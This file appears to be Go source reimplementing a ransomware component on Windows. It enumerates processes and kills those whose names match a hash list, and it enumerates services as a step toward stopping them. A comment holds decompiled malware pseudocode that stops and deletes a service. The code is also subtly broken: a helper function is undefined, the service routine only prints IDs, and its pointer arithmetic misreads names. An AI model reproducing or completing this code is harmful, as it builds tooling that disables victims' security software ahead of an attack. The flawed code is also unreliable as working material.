package main

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const TH32CS_SNAPPROCESS = 0x00000002

// use with admin priviledge
func killTargetProcesses(processes []WindowsProcess, processHashList []uint32) (err error) {

	hashMap := make(map[uint32]bool, len(processHashList))
	for _, hash := range processHashList {
		hashMap[hash] = true
	}

	for _, process := range processes {
		processHash := bufferHashing([]byte(strings.ToLower(strings.ReplaceAll(process.Exe, ".exe", ""))))
		if hashMap[processHash] {
			// kill process
			procHandle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, uint32(process.ProcessID))

			if err != nil {
				return err
			}

			defer windows.CloseHandle(procHandle)

			err = windows.TerminateProcess(procHandle, 1)
		}
	}
	return nil
}

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

func getProcesses() ([]WindowsProcess, error) {
	snapshotHandle, err := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

	if err != nil {
		return nil, err
	}

	defer windows.CloseHandle(snapshotHandle)

	var procEntry windows.ProcessEntry32

	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	// proc first

	err = windows.Process32First(snapshotHandle, &procEntry)

	if err != nil {
		return nil, err
	}

	processLists := make([]WindowsProcess, 0, 50)

	for {
		processLists = append(processLists, newWindowsProcess(&procEntry))

		err = windows.Process32Next(snapshotHandle, &procEntry)
		if err != nil {
			if err == syscall.ERROR_NO_MORE_FILES {
				return processLists, nil
			}
			return nil, err
		}
	}
}

func newWindowsProcess(e *windows.ProcessEntry32) WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}

	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

func killTargetServices(serviceHashList []uint32) (err error) {
	hashMap := make(map[uint32]bool, len(serviceHashList))
	for _, hash := range serviceHashList {
		hashMap[hash] = true
	}

	scManagerHandle, err := windows.OpenSCManager(nil, nil, 4)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(scManagerHandle)

	var bufSizeNeeded uint32 = 0
	var servicesReturned uint32 = 0
	err = windows.EnumServicesStatusEx(scManagerHandle, 0, windows.SERVICE_WIN32, windows.SERVICE_STATE_ALL, nil, 0, &bufSizeNeeded, &servicesReturned, nil, nil)

	if err != windows.ERROR_MORE_DATA {
		return err
	}

	var serviceStatusBuffer = make([]byte, bufSizeNeeded)
	err = windows.EnumServicesStatusEx(scManagerHandle, 0, windows.SERVICE_WIN32, windows.SERVICE_STATE_ALL, (*byte)(&(serviceStatusBuffer[0])), bufSizeNeeded, &bufSizeNeeded, &servicesReturned, nil, nil)

	var services []windows.ENUM_SERVICE_STATUS_PROCESS = *(*[]windows.ENUM_SERVICE_STATUS_PROCESS)(unsafe.Pointer(&serviceStatusBuffer))
	var i uint32 = 0
	// wideCharBuffer := make([]byte, 2)
	// var wideChar uint16
	for ; i < servicesReturned; i++ {

		start := unsafe.Pointer(services[i].DisplayName)
		size := unsafe.Sizeof(uint16(0))
		var wideChar uint16
		name := []uint16{}
		tempIndex := 0
		for {
			wideChar = *(*uint16)(unsafe.Pointer(start))
			if wideChar == 0 {
				break
			}
			name = append(name, wideChar)
			tempIndex++
			start = unsafe.Pointer(uintptr(start) + size*uintptr(tempIndex))
		}
		//fmt.Println("name: ", windows.UTF16ToString(name))
		fmt.Println("proc id:", services[i].ServiceStatusProcess.ProcessId)
	}

	fmt.Println("bufSizeNeeded: ", bufSizeNeeded)
	fmt.Println("servicesReturned: ", servicesReturned)
	return nil
}

// v5 = 0;
// SC_Manager_handle = mw_OpenSCManagerW(0, 0, 4);
// if ( SC_Manager_handle )
// {
//   service_handle = mw_OpenServiceW(SC_Manager_handle, service_name, 65568);
//   if ( service_handle )
//   {
// 	mw_memset(v2, 0, 28);
// 	mw_ControlService(service_handle, SERVICE_CONTROL_STOP, v2);
// 	mw_DeleteService(service_handle);
// 	mw_CloseServiceHandle(service_handle);
// 	v5 = 1;
//   }
// }
// if ( SC_Manager_handle )
//   mw_CloseServiceHandle(SC_Manager_handle);
// return v5;
